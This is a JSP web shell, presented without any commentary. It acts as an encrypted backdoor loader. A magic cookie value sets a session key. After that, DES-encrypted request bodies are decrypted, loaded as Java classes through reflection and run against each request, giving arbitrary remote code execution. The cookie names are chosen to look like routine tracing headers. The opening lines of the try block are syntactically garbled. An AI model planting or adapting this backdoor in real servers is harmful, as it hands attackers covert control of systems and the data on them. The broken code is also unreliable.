<%
    if (session.getAttribute("isLogin") != null) {
        try {

            application.getAttribute("Cookies") + "").getMethod("invoke", new Class[]{HttpServletRequest.class, HttpServletResponse.class}).invoke(null, new Object[]{request, response}
                    Class.forName();
        } catch (ClassNotFoundException e) {
            java.lang.reflect.Method method = ClassLoader.class.getDeclaredMethod("defineClass", new Class[]{byte[].class, int.class, int.class});

            method.setAccessible(true);
            java.io.InputStream inputStream = request.getInputStream();
            java.io.ByteArrayOutputStream byteArrayOutputStream = new java.io.ByteArrayOutputStream();
            int n = 0;
            while ((n = inputStream.read()) != -1)
                byteArrayOutputStream.write(n);
            javax.crypto.Cipher cipher = javax.crypto.Cipher.getInstance("DES");
            cipher.init(2, javax.crypto.SecretKeyFactory.getInstance("DES").generateSecret(new javax.crypto.spec.DESKeySpec(session.getAttribute("isLogin").toString().getBytes())));
            byte[] ddat = cipher.doFinal(byteArrayOutputStream.toByteArray());
            Class m = (Class) method.invoke(Thread.currentThread().getContextClassLoader(), new Object[]{ddat, new Integer(0), new Integer(ddat.length)});
            application.setAttribute("Cookies", m.getName());
            response.addCookie(new Cookie("X-Ua-Compatible", java.util.UUID.randomUUID().toString()));
        }
    } else if (request.getHeader("Cookie") != null && request.getHeader("Cookie").indexOf("F7A4A404") != -1) {
        String isLogin = java.util.UUID.randomUUID().toString().replaceAll("-", "").toUpperCase();
        response.addCookie(new Cookie("eagleeye-traceid", isLogin));
        session.setAttribute("isLogin", isLogin.substring(0, 8));
    }
    out.clear();
    out = pageContext.pushBody();
%>